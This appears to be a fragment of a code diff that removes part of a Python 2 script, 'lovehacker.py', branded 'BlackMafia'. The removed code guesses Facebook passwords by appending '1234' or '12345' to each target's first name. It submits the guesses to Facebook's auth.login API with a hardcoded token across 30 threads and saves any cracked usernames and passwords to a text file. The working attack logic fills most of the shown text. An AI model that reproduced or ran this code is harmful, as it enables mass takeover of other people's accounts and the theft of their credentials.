-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos3
-                        cek = open('done/usa.txt', 'a')
-                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
-                        cek.close()
-                        cekpoint.append(zowe)
-                    else:
-                        bos4 = j['first_name'] + '1234'
-                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                        ko = json.load(data)
-                        if 'access_token' in ko:
-                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
-                            oke = open('done/usa.txt', 'a')
-                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
-                            oke.close()
-                            oks.append(zowe)
-                        elif 'www.facebook.com' in ko['error_msg']:
-                            print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos4
-                            cek = open('done/usa.txt', 'a')
-                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
-                            cek.close()
-                            cekpoint.append(zowe)
-                        else:
-                            bos5 = j['first_name'] + '12345'
-                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                            ko = json.load(data)
-                            if 'access_token' in ko:
-                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
-                                oke = open('done/usa.txt', 'a')
-                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
-                                oke.close()
-                                oks.append(zowe)
-                            elif 'www.facebook.com' in ko['error_msg']:
-                                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos5
-                                cek = open('done/usa.txt', 'a')
-                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
-                                cek.close()
-                                cekpoint.append(zowe)
-        except:
-            pass
-
-    p = ThreadPool(30)
-    p.map(main, id)
-    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80BlackMafia\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
-    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mFinished ...'
-    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;95mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;95m' + str(len(cekpoint))
-    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;95mCP \x1b[1;95mfile save \x1b[1;91m: \x1b[1;92mdone/usa.txt'
-    print 50 * '\x1b[1;94m\xe2\x94\x80'
-    raw_input('\x1b[1;97m{<\x1b[1;95mBack\x1b[1;97m>}')
     os.system('python2 lovehacker.py')
 
 
@@ -1901,15 +1333,6 @@ def user_id():
     raw_input('\n\x1b[1;95m[\x1b[1;97m<Back>\x1b[1;95m]')
     menu()
 
-
-def perbarui():
-    os.system('clear')
-    print logo
-    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80BlackMafia\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
-    jalan('\x1b[1;92mUpdate Script ...\x1b[1;93m')
-    os.system('git pull origin master')
-    raw_input('\n\x1b[1;94m{\x1b[1;97m<Back>\x1b[1;94m}')
-    os.system('python2 lovehacker.py')
 
 
 if __name__ == '__main__':
